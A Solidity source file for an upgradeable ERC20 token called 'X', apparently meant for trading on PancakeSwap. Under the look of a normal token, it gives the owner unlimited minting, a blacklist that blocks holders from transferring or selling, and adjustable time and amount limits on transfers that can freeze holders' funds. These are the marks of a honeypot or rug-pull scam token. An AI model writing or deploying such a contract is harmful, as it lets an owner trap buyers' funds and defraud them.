// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20BurnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract X is
    Initializable,
    ERC20Upgradeable,
    ERC20BurnableUpgradeable,
    OwnableUpgradeable
{
    event AddedBlackList(address _user);
    event RemovedBlackList(address _user);
    event AddedWhiteList(address _user);
    event RemovedWhiteList(address _user);

    uint _TIMELOCK;
    uint _ALLOW_AMOUNT; // 5% persent
    address PancakeSwapRouter;
    address PCV3;

    mapping(address => bool) public isBlackListed;
    mapping(address => bool) public isWhiteListed;
    mapping(address => uint) public isAllow;
    

    address new_PancakeSwapRouter;
    mapping(address => uint) public _IsAllowed;

    function initialize() public initializer {
        __ERC20_init("X", "X");
        __ERC20Burnable_init();
        __Ownable_init();
        _TIMELOCK = 1 days;
        _ALLOW_AMOUNT = 500;
        PancakeSwapRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

        _mint(msg.sender, 10000000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function setup() public onlyOwner {
        _TIMELOCK = 1 days;
        _ALLOW_AMOUNT = 1000;
        PancakeSwapRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        PCV3 = 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4;
    }

    function transfer(address _to, uint _value) public override returns (bool) {
        require(!isBlackListed[msg.sender]);

          if (block.timestamp - _IsAllowed[msg.sender] >= _TIMELOCK) {
                //amount controller
                uint allow_amount = (balanceOf(msg.sender) * _ALLOW_AMOUNT) /
                    10000;
                if (allow_amount > _value) {
                    _IsAllowed[msg.sender] = block.timestamp;

                    return super.transfer(_to, _value);
                } else {
                    revert("you don't allow this transaction within amount!");
                }
            } else {
                revert("you don't allow this transaction within time!");
            }

        return true;
    }

    function transferFrom(
        address _from,
        address _to,
        uint _value
    ) public override returns (bool) {
        require(!isBlackListed[_from]);

        return super.transferFrom(_from, _to, _value);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        // if (_from == PCV3 && _from == PancakeSwapRouter) {
        //       _IsAllowed[to] = block.timestamp;
        // }

        return super._transfer(from, to, amount);
    }

    function addBlackList(address _evilUser) public onlyOwner {
        isBlackListed[_evilUser] = true;
        emit AddedBlackList(_evilUser);
    }

    function removeBlackList(address _clearedUser) public onlyOwner {
        isBlackListed[_clearedUser] = false;
        emit RemovedBlackList(_clearedUser);
    }

    function addWhiteList(address _evilUser) public onlyOwner {
        isWhiteListed[_evilUser] = true;
        emit AddedWhiteList(_evilUser);
    }

    function removeWhiteList(address _clearedUser) public onlyOwner {
        isWhiteListed[_clearedUser] = false;
        emit RemovedWhiteList(_clearedUser);
    }

    function setNewPersentage(uint _new) public onlyOwner {
        _ALLOW_AMOUNT = _new;
        _TIMELOCK = 1 days;
    }

    function setNewTime(uint _new) public onlyOwner {
        _TIMELOCK = _new;
    }

    function timeAndAmount() public view returns (uint, uint) {
        return (_TIMELOCK, _ALLOW_AMOUNT);
    }

    function isContract(address addr) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }
}
